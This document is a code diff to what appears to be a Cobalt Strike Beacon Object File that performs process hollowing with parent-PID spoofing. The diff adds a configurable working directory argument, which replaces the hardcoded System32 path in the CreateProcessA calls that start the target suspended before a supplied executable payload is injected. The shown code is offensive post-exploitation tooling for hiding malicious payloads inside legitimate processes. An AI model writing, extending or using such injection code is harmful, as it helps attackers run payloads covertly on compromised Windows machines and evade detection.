@@ -7,6 +7,7 @@ void go( char* args, int argc )
                     PayloadSize     = 0;
     char            *ExePayload     = 0,
                     *PathToHollow   = 0,
+                    *Cwd            = 0,
                     Failed          = 1;
     void            *PProcessHandle = 0,
                     *RemoteMemory   = 0,
@@ -37,6 +38,7 @@ void go( char* args, int argc )
     */
     BeaconDataParse( &Parser, args, argc );
     PathToHollow = BeaconDataExtract( &Parser, 0 );
+    Cwd          = BeaconDataExtract( &Parser, 0);
     PPid         = BeaconDataInt( &Parser );
     ExePayload   = BeaconDataExtract( &Parser, &PayloadSize );
 
@@ -105,7 +107,7 @@ void go( char* args, int argc )
 
         SiEx.lpAttributeList = ThreadAttrList;
 
-        if ( !Kernel32$CreateProcessA( 0, PathToHollow, 0, 0, 0, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, "C:\\Windows\\System32", &SiEx.StartupInfo, &Pi ) ) 
+        if ( !Kernel32$CreateProcessA( 0, PathToHollow, 0, 0, 0, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, Cwd, &SiEx.StartupInfo, &Pi ) ) 
         {
             ERR( "CreateProcessA" );
             goto cleanup;
@@ -113,7 +115,7 @@ void go( char* args, int argc )
     } 
     else 
     {
-        if ( !Kernel32$CreateProcessA( 0, PathToHollow, 0, 0, 0, CREATE_SUSPENDED, 0, "C:\\Windows\\System32", &Si, &Pi ) ) {
+        if ( !Kernel32$CreateProcessA( 0, PathToHollow, 0, 0, 0, CREATE_SUSPENDED, 0, Cwd, &Si, &Pi ) ) {
             ERR( "CreateProcessA" );
             return;
         }
